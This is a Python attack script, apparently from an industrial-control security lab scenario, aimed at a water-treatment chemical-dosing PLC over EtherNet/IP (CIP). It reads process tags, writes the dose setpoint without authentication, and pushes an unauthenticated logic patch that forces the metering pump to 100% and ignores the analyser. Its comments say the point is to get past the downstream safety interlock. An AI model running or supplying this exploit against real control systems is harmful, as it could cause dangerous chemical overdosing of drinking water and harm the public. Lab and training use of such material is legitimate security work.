#!/usr/bin/env python3
"""Scenario 8, EtherNet/IP (CIP) against plc-dosing.

  cip_attack.py read                  read the dosing tags
  cip_attack.py set <ppm>             write DoseSetpoint (default 15.0)
  cip_attack.py logic-push            POST the unauthenticated program download
"""
import socket
import sys
import urllib.request

from cpppo.server.enip import client

import targets as T

ip = socket.gethostbyname(T.guard(T.PLC_DOSING))


def _pipe(ops):
    with client.connector(host=ip, port=T.ENIP_PORT, timeout=3) as conn:
        return list(conn.pipeline(operations=client.parse_operations(ops), depth=1))


def read():
    tags = ["DoseSetpoint", "DoseRate", "FlowFeedback", "Mode", "LogicRev", "LogicForced"]
    for tag, (_, _, _, _, sts, val) in zip(tags, _pipe(tags)):
        print(f"    {tag:<22} {val}  (sts {sts})")


def set_sp():
    ppm = float(sys.argv[2]) if len(sys.argv) > 2 else 15.0
    print(f"[*] CIP write DoseSetpoint = (REAL){ppm}")
    _pipe([f"DoseSetpoint=(REAL){ppm}", "DoseSetpoint"])
    print("    the metering pump rate follows the setpoint. The downstream")
    print("    interlock still catches this near 4 ppm, hence logic-push.")


def logic_push():
    url = f"http://{ip}:{T.HTTP_PORT}/logic"
    body = b"crosscreek_dosing_v1_PATCHED  ; force MP-301 = 100%, ignore AIT-301"
    print(f"[*] POST {url}")
    try:
        with urllib.request.urlopen(urllib.request.Request(url, data=body), timeout=4) as r:
            print(r.read().decode("utf-8", "replace"))
    except urllib.error.HTTPError as e:
        print(f"    {e.code}: {e.read().decode('utf-8', 'replace')}")
    print("    with the pushed program running, the residual is unbounded.")


if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "read"
    {"read": read, "set": set_sp, "logic-push": logic_push}.get(
        cmd, lambda: print(__doc__))()
